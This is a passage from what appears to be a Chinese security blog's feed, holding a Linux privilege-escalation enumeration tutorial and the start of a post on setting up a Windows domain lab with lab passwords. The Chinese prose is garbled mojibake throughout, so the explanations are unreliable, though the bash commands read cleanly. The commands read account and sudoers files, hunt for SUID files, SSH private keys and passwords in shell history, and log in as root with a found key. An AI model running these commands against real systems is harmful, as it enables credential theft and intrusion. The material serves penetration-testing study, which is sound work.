-m<br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹å‘è¡Œç‰ˆæœ¬ä¿¡æ¯</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/*-release<br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹ç³»ç»Ÿä¸»æœºåä¿¡æ¯</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">hostname<br><span class="hljs-built_in">uname</span> -n<br></code></pre></td></tr></table></figure><h1 id="ç”¨æˆ·ä¿¡æ¯æšä¸¾"><a href="#ç”¨æˆ·ä¿¡æ¯æšä¸¾" class="headerlink" title="ç”¨æˆ·ä¿¡æ¯æšä¸¾"></a>ç”¨æˆ·ä¿¡æ¯æšä¸¾</h1><p><strong>æŸ¥çœ‹å½“å‰ç”¨æˆ·</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹å½“å‰ç”¨æˆ·è¯¦ç»†ä¿¡æ¯</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">id</span> <span class="hljs-comment">#åŒ…å«ç”¨æˆ·åã€ç”¨æˆ·IDå’Œç”¨æˆ·æ‰€å±ç»„åŠç»„ID</span><br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹æ‰€æœ‰ç”¨æˆ·ä¿¡æ¯</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/passwd<br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹ç³»ç»Ÿä¸­æ‰€æœ‰ç”¨æˆ·ç»„</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/group<br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹idå’Œå¯¹åº”ç»„ä¿¡æ¯</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">cut</span> -d <span class="hljs-string">&quot;:&quot;</span> -f1 /etc/passwd 2&gt;/dev/null);<span class="hljs-keyword">do</span> <span class="hljs-built_in">id</span> <span class="hljs-variable">$i</span>;<span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹å½“å‰ç™»é™†åˆ°ç³»ç»Ÿçš„ç”¨æˆ·ä¿¡æ¯</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">w <span class="hljs-comment">#å¯ä»¥è¾“å‡ºç”¨æˆ·çš„ç™»å½•åã€æ‰€ä½¿ç”¨çš„ç»ˆç«¯ã€å½“å‰æ­£åœ¨æ‰§è¡Œçš„å‘½ä»¤ã€ç™»é™†æ—¶é—´å’Œç³»ç»Ÿè¿è¡Œæ—¶é—´ç­‰ä¿¡æ¯</span><br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹å½“å‰ç™»é™†çš„ç”¨æˆ·</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">users</span> <span class="hljs-comment">#ä»…ä¼šåˆ—å‡ºç”¨æˆ·å</span><br></code></pre></td></tr></table></figure><p><strong>å†å²ç™»é™†ä¿¡æ¯</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">last<br></code></pre></td></tr></table></figure><p><strong>æŸ¥æ‰¾ç³»ç»Ÿä¸­æ‰€æœ‰è¶…ç®¡ç”¨æˆ·</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">grep -v -E <span class="hljs-string">&quot;^#&quot;</span> /etc/passwd 2&gt;/dev/null | awk -F: <span class="hljs-string">&#x27;$3 == 0 &#123;print $1&#125;&#x27;</span> 2&gt;/dev/null<br></code></pre></td></tr></table></figure><h1 id="ç¯å¢ƒé…ç½®æšä¸¾"><a href="#ç¯å¢ƒé…ç½®æšä¸¾" class="headerlink" title="ç¯å¢ƒé…ç½®æšä¸¾"></a>ç¯å¢ƒé…ç½®æšä¸¾</h1><ul><li>ç³»ç»Ÿè·¯å¾„ï¼šPATHç¯å¢ƒå˜é‡å­˜å‚¨äº†ç³»ç»Ÿä¸­å¯æ‰§è¡Œæ–‡ä»¶çš„ä½ç½®</li><li>ç”¨æˆ·ä¿¡æ¯ï¼šHOMEç¯å¢ƒå˜é‡å­˜å‚¨äº†ç”¨æˆ·çš„å®¶ç›®å½•è·¯å¾„ï¼ŒUSERç¯å¢ƒå˜é‡å­˜å‚¨äº†ç”¨æˆ·å</li><li>å‘½ä»¤è¡Œé€‰é¡¹ï¼šSHELLç¯å¢ƒå˜é‡å­˜å‚¨äº†ç”¨æˆ·çš„é»˜è®¤Shellç¨‹åºçš„è·¯å¾„</li><li>å…¶ä»–ä¿¡æ¯ï¼šLANGUAGEç¯å¢ƒå˜é‡å­˜å‚¨äº†ç”¨æˆ·çš„é»˜è®¤è¯­è¨€ç¯å¢ƒ</li></ul><p>ç¯å¢ƒå˜é‡é…ç½®ä¸å½“å¯èƒ½å¯¼è‡´æƒé™æå‡</p><p><strong>æŸ¥çœ‹ç³»ç»Ÿç¯å¢ƒå˜é‡</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">env</span> 2&gt;/dev/null | grep -v <span class="hljs-string">&#x27;LS_COLORS&#x27;</span> 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ä¿¡æ¯</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹ç”¨æˆ·ç¯å¢ƒé…ç½®æ–‡ä»¶</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/profile<br></code></pre></td></tr></table></figure><p>&#x2F;etc&#x2F;profileæ˜¯Linuxçš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼ŒåŒ…å«äº†ç³»ç»Ÿçº§åˆ«çš„é…ç½®ä¿¡æ¯ï¼›åœ¨å¯åŠ¨æ—¶è¢«è¯»å–ï¼Œå¹¶è®¾ç½®ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡ã€ç”¨æˆ·å˜é‡ã€Shellé€‰é¡¹ç­‰ã€‚profileè¿˜å¯ä»¥åŒ…å«shellè„šæœ¬ç”¨äºæ‰§è¡Œä¸€äº›åˆå§‹åŒ–å’Œé…ç½®å·¥ä½œ</p><p><strong>æŸ¥çœ‹å¯ç”¨Shellè·¯å¾„</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/shells<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151511102.png" alt="image-20240625202026353"></p><h1 id="ç½‘ç»œä¿¡æ¯æšä¸¾"><a href="#ç½‘ç»œä¿¡æ¯æšä¸¾" class="headerlink" title="ç½‘ç»œä¿¡æ¯æšä¸¾"></a>ç½‘ç»œä¿¡æ¯æšä¸¾</h1><p><strong>æŸ¥çœ‹ç½‘ç»œæ¥å£ä¿¡æ¯</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">ifconfig -a<br>ip addr show<br></code></pre></td></tr></table></figure><p>è¿˜å¯ä»¥é€šè¿‡æŸ¥çœ‹IPé…ç½®æ–‡ä»¶æ¥æŸ¥çœ‹ç½‘ç»œæ¥å£ä¿¡æ¯</p><ul><li>Ubuntu18ä¹‹å‰æŸ¥çœ‹&#x2F;etc&#x2F;network&#x2F;interfacesæ–‡ä»¶</li><li>Ubuntu18ä¹‹åæŸ¥çœ‹&#x2F;etc&#x2F;netplan&#x2F;*.yaml</li><li>CentOS 8åŠä¹‹å‰æŸ¥çœ‹&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-*æ–‡ä»¶</li><li>CentOS Stream 9æŸ¥çœ‹&#x2F;etc&#x2F;NetworkManager&#x2F;system-connections&#x2F;ä¸‹çš„æ–‡ä»¶</li></ul><p><strong>æŸ¥çœ‹ARPç¼“å­˜ä¿¡æ¯</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">arp -a<br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹è·¯ç”±ä¿¡æ¯</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">route<br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹ç½‘ç»œè¿æ¥ä¿¡æ¯</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">netstat -antlp 2&gt;/dev/null <span class="hljs-comment">#æŸ¥çœ‹æ‰€æœ‰ç½‘ç»œè¿æ¥ä¿¡æ¯</span><br>netstat -ntpl 2&gt;/dev/null <span class="hljs-comment">#æŸ¥çœ‹æ­£åœ¨ç›‘å¬çš„TCPç«¯å£</span><br>netstat -nupl 2&gt;/dev/null <span class="hljs-comment">#æŸ¥çœ‹æ­£åœ¨ç›‘å¬çš„UDPç«¯å£</span><br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹DNSä¿¡æ¯</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/resolv.conf <span class="hljs-comment">#æŸ¥çœ‹è¯¥DNSé…ç½®æ–‡ä»¶ï¼Œé‡Œé¢ä¿å­˜äº†æœ¬åœ°ç³»ç»Ÿç”¨äºåŸŸåè§£æçš„DNSæœåŠ¡å™¨ä¿¡æ¯</span><br></code></pre></td></tr></table></figure><h1 id="ç³»ç»Ÿè¿›ç¨‹æšä¸¾"><a href="#ç³»ç»Ÿè¿›ç¨‹æšä¸¾" class="headerlink" title="ç³»ç»Ÿè¿›ç¨‹æšä¸¾"></a>ç³»ç»Ÿè¿›ç¨‹æšä¸¾</h1><p><strong>æŸ¥çœ‹ç³»ç»Ÿè¿›ç¨‹</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">ps aux 2&gt;/dev/null<br>ps aux 2&gt;/dev/null | grep <span class="hljs-string">&#x27;root&#x27;</span> 2&gt;/dev/null <span class="hljs-comment">#æŸ¥çœ‹ä»¥rootæƒé™è¿è¡Œçš„è¿›ç¨‹</span><br>ps aux 2&gt;/dev/null | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | xargs -r <span class="hljs-built_in">ls</span> -la 2&gt;/dev/null | awk <span class="hljs-string">&#x27;!x[$0]++&#x27;</span> 2&gt;/dev/null <span class="hljs-comment">#æŸ¥çœ‹è¿›ç¨‹æ‰€å¯¹åº”çš„äºŒè¿›åˆ¶æ–‡ä»¶åŠæƒé™ä¿¡æ¯</span><br></code></pre></td></tr></table></figure><h1 id="ç‰¹æƒè®¿é—®æšä¸¾"><a href="#ç‰¹æƒè®¿é—®æšä¸¾" class="headerlink" title="ç‰¹æƒè®¿é—®æšä¸¾"></a>ç‰¹æƒè®¿é—®æšä¸¾</h1><p><strong>æŸ¥çœ‹sudoersæ–‡ä»¶</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/sudoers <span class="hljs-comment">#è¯¥é…ç½®æ–‡ä»¶ç”¨äºæˆæƒæŸäº›ç”¨æˆ·ä»¥è¶…çº§æƒé™æ‰§è¡Œç‰¹å®šçš„å‘½ä»¤ï¼Œé»˜è®¤æƒ…å†µè¯¥æ–‡ä»¶åªæœ‰rootèƒ½è¯»å–</span><br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹æ˜¯å¦å¯ä»¥æ— å¯†ç ä½¿ç”¨sudo</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&#x27;</span> | sudo -S -l -k<br></code></pre></td></tr></table></figure><ul><li>-Sè¡¨ç¤ºä»æ ‡å‡†è¾“å…¥è·å–å¯†ç ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢çš„ç©ºå¯†ç </li><li>-l è¡¨ç¤ºåˆ—å‡ºå½“å‰ç”¨æˆ·èƒ½ç”¨çš„æƒé™</li><li>-k è¡¨ç¤ºé‡ç½®æ—¶é—´æˆ³ï¼Œä¹Ÿå°±æ˜¯ä¸‹æ¬¡å†æ‰§è¡Œsudoæ—¶ä¾¿éœ€è¦è¾“å…¥å¯†ç </li></ul><h1 id="cronä»»åŠ¡æšä¸¾"><a href="#cronä»»åŠ¡æšä¸¾" class="headerlink" title="cronä»»åŠ¡æšä¸¾"></a>cronä»»åŠ¡æšä¸¾</h1><p><strong>æŸ¥çœ‹æ‰€æœ‰cronä»»åŠ¡</strong></p><p>åˆ—å‡º&#x2F;etc&#x2F;ä¸‹æ‰€æœ‰ä»¥cronå¼€å¤´çš„æ–‡ä»¶çš„è¯¦ç»†ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -la /etc/cron* 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€äº›å¯èƒ½çš„æ–‡ä»¶ï¼š</p><ul><li>&#x2F;etc&#x2F;crontabï¼šè¯¥æ–‡ä»¶æ˜¯cronçš„ä¸»é…ç½®æ–‡ä»¶ï¼Œç”¨æ¥ç®¡ç†å…¨å±€å®šæ—¶ä»»åŠ¡ï¼Œå³å¯¹æ•´ä¸ªç³»ç»Ÿæœ‰æ•ˆçš„å®šæ—¶ä»»åŠ¡ï¼ŒåŒ…å«ä»»åŠ¡çš„æ—¶é—´ã€å‘½ä»¤ä»¥åŠæ‰§è¡Œæ­¤ä»»åŠ¡çš„ç”¨æˆ·ã€‚æ­¤é…ç½®ä»»åŠ¡è¿˜åŒ…å«ï¼šSHELLå­—æ®µï¼Œç”¨æ¥æŒ‡å®šè¿è¡Œä»»åŠ¡æ—¶ä½¿ç”¨çš„Shellè·¯å¾„ä¿¡æ¯ï¼›PATHå­—æ®µï¼Œç”¨æ¥æŒ‡å®šè¿è¡Œcronä½œä¸šæ—¶ä½¿ç”¨çš„ç¯å¢ƒå˜é‡è·¯å¾„çš„å€¼ã€‚</li><li>&#x2F;etc&#x2F;cron.dç›®å½•ï¼Œè¯¥ç›®å½•ä¸‹ä¹Ÿä¸€èˆ¬å­˜æ”¾ç³»ç»Ÿçº§åˆ«çš„å®šæ—¶ä»»åŠ¡</li><li>&#x2F;etc&#x2F;cron.dailyã€&#x2F;etc&#x2F;cron.hourlyã€&#x2F;etc&#x2F;cron.monthlyã€&#x2F;etc&#x2F;cron.weeklyç›®å½•ä¸‹åˆ†åˆ«æŒ‡å®šäº†æ¯å¤©ã€æ¯å°æ—¶ã€æ¯ä¸ªæœˆã€æ¯å‘¨è¿è¡Œä¸€æ¬¡çš„è„šæœ¬ã€‚</li></ul><p><strong>æ‰€æœ‰ç”¨æˆ·çš„å®šæ—¶ä»»åŠ¡</strong></p><p>åˆ—ä¸¾æ‰€æœ‰ç”¨æˆ·çš„å®šæ—¶ä»»åŠ¡(éœ€è¦rootæƒé™)</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> $(getent passwd | <span class="hljs-built_in">cut</span> -f1 -d:); <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;### Crontabs for <span class="hljs-variable">$user</span> ####&quot;</span>; crontab -u <span class="hljs-variable">$user</span> -l; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹å½“å‰ç”¨æˆ·çš„å®šæ—¶ä»»åŠ¡</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">crontab -l<br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹å…¶ä»–ç”¨æˆ·çš„å®šæ—¶ä»»åŠ¡</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">crontab -l -u &lt;ç”¨æˆ·å&gt;<br></code></pre></td></tr></table></figure><h1 id="è½¯ä»¶ä¿¡æ¯æšä¸¾"><a href="#è½¯ä»¶ä¿¡æ¯æšä¸¾" class="headerlink" title="è½¯ä»¶ä¿¡æ¯æšä¸¾"></a>è½¯ä»¶ä¿¡æ¯æšä¸¾</h1><p><strong>CentOSæŸ¥çœ‹å·²å®‰è£…ç¨‹åº</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">yum list installed<br></code></pre></td></tr></table></figure><p><strong>Debianã€UbuntuæŸ¥çœ‹å·²å®‰è£…ç¨‹åº</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">dpkg -l<br>apt list<br></code></pre></td></tr></table></figure><h1 id="æ–‡ä»¶æšä¸¾"><a href="#æ–‡ä»¶æšä¸¾" class="headerlink" title="æ–‡ä»¶æšä¸¾"></a>æ–‡ä»¶æšä¸¾</h1><p><strong>æŸ¥çœ‹ç³»ç»Ÿæ˜¯å¦å®‰è£…äº†æ–‡ä»¶ä¼ è¾“ã€Shellåå¼¹ã€ä»£ç ç¼–è¯‘ç­‰å·¥å…·</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">which</span> nc 2&gt;/dev/null;<span class="hljs-built_in">which</span> netcat 2&gt;/dev/null;<span class="hljs-built_in">which</span> wget 2&gt;/dev/null;<span class="hljs-built_in">which</span> nmap 2&gt;/dev/null;<span class="hljs-built_in">which</span> gcc 2&gt;/dev/null;<span class="hljs-built_in">which</span> curl 2&gt;/dev/null;<br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹ç³»ç»Ÿæ•æ„Ÿæ–‡ä»¶æƒé™</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -al /etc/passwd 2&gt;/dev/null;<span class="hljs-built_in">ls</span> -al /etc/group 2&gt;/dev/null;<span class="hljs-built_in">ls</span> -al /etc/profile 2&gt;/dev/null;<span class="hljs-built_in">ls</span> -al /etc/shadow 2&gt;/dev/null;<br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹ç‰¹æ®Šæƒé™æ–‡ä»¶</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null <span class="hljs-comment">#æŸ¥çœ‹SUIDæƒé™æ–‡ä»¶</span><br>find / -perm -g=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null <span class="hljs-comment">#æŸ¥çœ‹SGIDæƒé™æ–‡ä»¶</span><br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹å¯å†™æ–‡ä»¶</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#æŸ¥æ‰¾ä¸å±äºå½“å‰ç”¨æˆ·ä½†æ˜¯å½“å‰ç”¨æˆ·å¯å†™çš„æ–‡ä»¶(æ’é™¤/proc/å’Œ/sys/ç›®å½•ä¸‹çš„æ–‡ä»¶)</span><br>find / -writable ! -user `<span class="hljs-built_in">whoami</span>` -<span class="hljs-built_in">type</span> f ! -path <span class="hljs-string">&quot;/proc/*&quot;</span> ! -path <span class="hljs-string">&quot;/sys/*&quot;</span> -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -al &#123;&#125; \; 2&gt;/dev/null<br><span class="hljs-comment">#å¦ä¸€ç§æ–¹å¼</span><br>find / -perm -2 -<span class="hljs-built_in">type</span> f ! -path <span class="hljs-string">&quot;/proc/*&quot;</span> ! -path <span class="hljs-string">&quot;/sys/*&quot;</span> -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -al &#123;&#125; \; 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹æŒ‡å®šæ‰©å±•åæ–‡ä»¶</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -name *.bak -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><strong>æŸ¥æ‰¾å…³é”®å­—æ–‡ä»¶</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#åœ¨å½“å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸­æŸ¥æ‰¾æ‰©å±•åä¸º.phpçš„æ–‡ä»¶ï¼Œæœç´¢å¹¶åˆ—å‡ºæ–‡ä»¶å†…å®¹åŒ…å«passçš„è¡Œï¼Œå¹¶è¾“å‡ºè¡Œå·</span><br>find . -name <span class="hljs-string">&quot;*.php&quot;</span> -print0 | xargs -0 grep -i -n <span class="hljs-string">&quot;pass&quot;</span><br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹å†å²å‘½ä»¤è®°å½•æ–‡ä»¶</strong></p><p>æŸ¥æ‰¾å¯èƒ½å­˜åœ¨çš„å†å²å‘½ä»¤è®°å½•æ–‡ä»¶ï¼Œå¦‚Bashå†å²è®°å½•æ–‡ä»¶ã€MySQLå†å²è®°å½•æ–‡ä»¶ç­‰ç­‰ã€‚</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -al ~/.*_history 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151511103.png" alt="image-20240625211315620"></p><p>å…¶ä¸­bash_historyè®°å½•å†å²å‘½ä»¤ï¼Œæˆ‘ä»¬å¯èƒ½ä»ä¸­è·å¾—ä¸€äº›æœåŠ¡çš„å‡­æ®ä¹‹ç±»çš„é‡è¦ä¿¡æ¯ã€‚</p><p><strong>æŸ¥çœ‹éšè—æ–‡ä»¶</strong></p><p>æ¯”å¦‚æœ‰äº›ç®¡ç†å‘˜ä¼šå°†éš¾è®°å¿†çš„å¯†ç é€šè¿‡éšè—æ–‡ä»¶çš„æ–¹å¼ä¿å­˜ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡bashå†å²å‘½ä»¤æ–‡ä»¶è¿›è¡Œæœç´¢æŸ¥çœ‹å¹¶è·å–ä¸€äº›æ•æ„Ÿä¿¡æ¯</p><p>è¿™æ˜¯ä¸€ä¸ªç¤ºä¾‹æŸ¥æ‰¾å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&quot;.*&quot;</span> -<span class="hljs-built_in">type</span> f -path <span class="hljs-string">&quot;/home/*&quot;</span> -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -al &#123;&#125; \; 2&gt;/dev/null<br><span class="hljs-built_in">cat</span> ~/.bash_history | grep -i passw <span class="hljs-comment">#åœ¨å†å²å‘½ä»¤æœç´¢æŒ‡å®šå­—ç¬¦ä¸²</span><br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹é…ç½®æ–‡ä»¶</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&quot;*.ovpn&quot;</span> -<span class="hljs-built_in">type</span> f -path <span class="hljs-string">&quot;/home/*&quot;</span> -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -al &#123;&#125; \; 2&gt;/dev/null <span class="hljs-comment">#.ovpnæ˜¯è™šæ‹Ÿä¸“ç”¨ç½‘ç»œçš„é…ç½®æ–‡ä»¶æ‰©å±•åï¼Œå³vpn</span><br></code></pre></td></tr></table></figure><p>æŸ¥æ‰¾ä¹‹åæˆ‘ä»¬å°±å¯ä»¥å»çœ‹çœ‹é‡Œé¢çš„æ–‡ä»¶æœ‰ä»€ä¹ˆä¿¡æ¯</p><p><strong>æŸ¥çœ‹SSHç§é’¥æ–‡ä»¶</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -name id_rsa 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p>å¦‚æœèƒ½æ‰¾åˆ°çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°†è¯¥æ–‡ä»¶å¤åˆ¶åˆ°kaliï¼Œç„¶åæ‰§è¡Œä¸‹é¢å‘½ä»¤ä»¥rootç”¨æˆ·ç™»é™†ç›®æ ‡æœåŠ¡å™¨</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 600 id_rsa <span class="hljs-comment">#è®¾ç½®æƒé™</span><br>ssh -i id_rsa root@&lt;ç›®æ ‡ä¸»æœºçš„ip&gt; <span class="hljs-comment">#ä½¿ç”¨id_rsaæ–‡ä»¶è¿æ¥</span><br></code></pre></td></tr></table></figure><h1 id="ä¿¡æ¯æœé›†è¾…åŠ©å·¥å…·"><a href="#ä¿¡æ¯æœé›†è¾…åŠ©å·¥å…·" class="headerlink" title="ä¿¡æ¯æœé›†è¾…åŠ©å·¥å…·"></a>ä¿¡æ¯æœé›†è¾…åŠ©å·¥å…·</h1><p><strong>Metasploitæ¨¡å—</strong></p><p>åœ¨Metasoloitçš„post&#x2F;linux&#x2F;gather&#x2F;æ–‡ä»¶å¤¹ä¸‹æœ‰å¾ˆå¤šé’ˆå¯¹æœåŠ¡å™¨ä¿¡æ¯æœé›†çš„åæ¸—é€æ¨¡å—ã€‚</p><p><strong>å¼€æºè„šæœ¬æœé›†ä¿¡æ¯</strong></p><p>æ¯”å¦‚LinEnumï¼Œå®ƒå¯ä»¥è·å–æœåŠ¡å™¨çš„å„ç§ä¿¡æ¯ï¼Œå…¶å®è¯¥è„šæœ¬å°±æ˜¯å¤šæ¡å‘½ä»¤çš„é›†åˆï¼Œä¹Ÿå¯ä»¥è‡ªå·±å†™ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ææƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çº¢æ—¥é¶åœºäºŒ</title>
      <link href="/2024/06/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/"/>
      <url>/2024/06/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h1><p><strong>ç¯å¢ƒè¯´æ˜</strong></p><p>å†…ç½‘ç½‘æ®µï¼š10.10.10.1&#x2F;24</p><p>DMZç½‘æ®µï¼š192.168.111.1&#x2F;24</p><p>æµ‹è¯•æœºåœ°å€ï¼š192.168.111.1ï¼ˆWindowsï¼‰ï¼Œ192.168.111.11ï¼ˆLinuxï¼‰</p><p>é˜²ç«å¢™ç­–ç•¥ï¼ˆç­–ç•¥è®¾ç½®è¿‡åï¼Œæµ‹è¯•æœºåªèƒ½è®¿é—®192æ®µåœ°å€ï¼Œæ¨¡æ‹Ÿå…¬ç½‘è®¿é—®ï¼‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">deny all tcp portsï¼š10.10.10.1<br>allow all tcp portsï¼š10.10.10.0/24<br></code></pre></td></tr></table></figure><p><strong>é…ç½®ä¿¡æ¯</strong></p><p><strong>DC</strong></p><p>IPï¼š10.10.10.10 OSï¼šWindows 2012(64)</p><p>åº”ç”¨ï¼šADåŸŸ</p><p><strong>WEB</strong></p><p>IP1ï¼š10.10.10.80 IP2ï¼š192.168.111.80 OSï¼šWindows 2008(64)</p><p>åº”ç”¨ï¼šWeblogic 10.3.6 MSSQL 2008</p><p><strong>PC</strong></p><p>IP1ï¼š10.10.10.201 IP2ï¼š192.168.111.201 OSï¼šWindows 7(32)</p><p>åº”ç”¨ï¼š</p><p><strong>æ”»å‡»æœº</strong></p><p>IPï¼š192.168.111.1 OSï¼šWindows 10(64)</p><p>IPï¼š192.168.111.11 OSï¼šParrot(64)</p><p><img src="http://cdn.clown2024.cn/202407151453562.png" alt="image-20240622210728382"></p><p><img src="http://cdn.clown2024.cn/202407151453563.png" alt="image-20240622214931742"></p><p>è®¾ç½®å¥½è¿™ä¸¤ä¸ªç½‘å¡ä¹‹åå°±å¼€å§‹ç»™è™šæ‹Ÿæœºåˆ†é…</p><p><strong>Webé¶æœº</strong></p><p><img src="https://cdn.clown2024.cn/image-20241112130239589.png" alt="image-20241112130239589"></p><p><img src="https://cdn.clown2024.cn/image-20241112130316473.png" alt="image-20241112130316473"></p><blockquote><p>ç”¨æˆ·ç™»å½•è´¦å·å¯†ç ä¸ºï¼šde1ayã€1qaz@WSX</p><p>ç®¡ç†å‘˜è´¦å·å¯†ç ä¸ºï¼šadministratorã€1qaz@WSX</p></blockquote><p><strong>DCé¶æœº</strong></p><p><img src="https://cdn.clown2024.cn/image-20241112130403392.png" alt="image-20241112130403392"></p><p><strong>PCé¶æœº</strong></p><p><img src="https://cdn.clown2024.cn/image-20241112130658110.png" alt="image-20241112130658110"></p><p>è¿™é‡Œçš„å¦ä¸€å¼ 